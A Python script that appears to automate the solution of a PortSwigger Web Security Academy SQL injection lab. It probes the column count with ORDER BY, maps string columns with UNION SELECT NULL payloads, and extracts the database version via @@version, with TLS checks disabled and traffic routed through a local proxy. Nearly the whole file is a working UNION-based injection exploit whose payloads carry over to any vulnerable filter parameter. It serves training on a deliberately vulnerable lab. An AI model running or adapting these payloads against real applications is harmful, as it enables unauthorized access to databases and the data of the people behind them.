#!/usr/bin/env python3
import sys
import warnings
from typing import List, Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from requests import Response

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.category = "Gifts"

    def _send_request(
        self, endpoint: str, params: Optional[dict] = None, method: str = "GET"
    ) -> Optional[Response]:
        """
        Internal helper, returns Response or None
        Used for discovery loops where non 200 status code are expected.
        """
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method=method,
                url=target_url,
                params=params,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except requests.RequestException:
            return None

    def _validated_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        method: str = "GET",
        stage: str = "unknown",
    ) -> Response:
        """
        Internal helper, returns Response
        Used in steps which MUST succeed (200 OK) to continue.
        """
        res = self._send_request(endpoint, params, method)
        if res is None:
            print(f"[-] Stage [{stage}]: Connection error")
            sys.exit(1)
        elif res.status_code != 200:
            print(f"[-] Stage [{stage}]: Received HTTP {res.status_code}")
            print(f"[-] Failed payload context: {params}")
            sys.exit(1)
        return res

    def is_alive(self) -> bool:
        """Checks if the lab URL is alive"""
        print("[*] Phase 1: Checking if lab is active...")
        res = self._validated_request("")
        return "academyLabBanner" in res.text

    def harvest_category(self) -> Optional[str]:
        """Dynamically identifies a valid category to anchor injection."""
        print("[*] Phase 2: Harvesting valid filter categories...")
        res = self._validated_request("")
        categories = []
        soup = BeautifulSoup(res.text, "html.parser")
        for tag in soup.find_all("a", class_="filter-category"):
            name = tag.get_text(strip=True)
            if "All" not in name:
                categories.append(name)
        return min(categories, key=len) if categories else None

    def get_table_width(self) -> int:
        print("[*] Phase 3: Determining column count...")
        for i in range(1, 11):
            payload = f"{self.category}' ORDER BY {i} -- "
            res = self._send_request("filter", params={"category": payload})
            if res is not None and res.status_code != 200:
                return i - 1
        return 0

    def map_string_indices(self, col_count: int) -> List[int]:
        print("[*] Phase 4: Mapping string-compatible columns...")
        str_indices = []
        marker = "asif-probe"
        for i in range(col_count):
            cols = ["NULL"] * col_count
            cols[i] = f"'{marker}'"
            paylaod = f"{self.category}' UNION SELECT {','.join(cols)} -- "
            res = self._send_request("filter", params={"category": paylaod})
            if res and marker in res.text:
                str_indices.append(i)
        return str_indices

    def solve(self):
        # Check if Lab URL is stil active
        if not self.is_alive():
            print("[-] The PortSwigger Lab URL is not reachable or has expired!")
            return

        # Extract categories
        category = self.harvest_category()
        if not category:
            print("[-] Could not find a valid category.")
            return
        self.category = category
        print(f"[+] Target category identified: {category}.")

        # Determine column count
        col_count = self.get_table_width()
        if col_count == 0:
            return
        print(f"[+] Column count: {col_count}.")

        # Map string-compatible column
        col_indices = self.map_string_indices(col_count)
        if not col_indices:
            return

        print("[*] Phase 5: Extracting Database Version...")
        cols = ["NULL"] * col_count
        cols[col_indices[0]] = "@@version"
        payload = f"{category}' UNION SELECT {','.join(cols)} -- "
        self._send_request("filter", params={"category": payload})

        print("[*] Phase 6: Verifying lab status...")
        res = self._send_request("")

        if res and "Congratulation" in res.text:
            print("[!] SUCCESS: Lab solved and verfied via session state.")
        else:
            print("[-] Lab failed!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
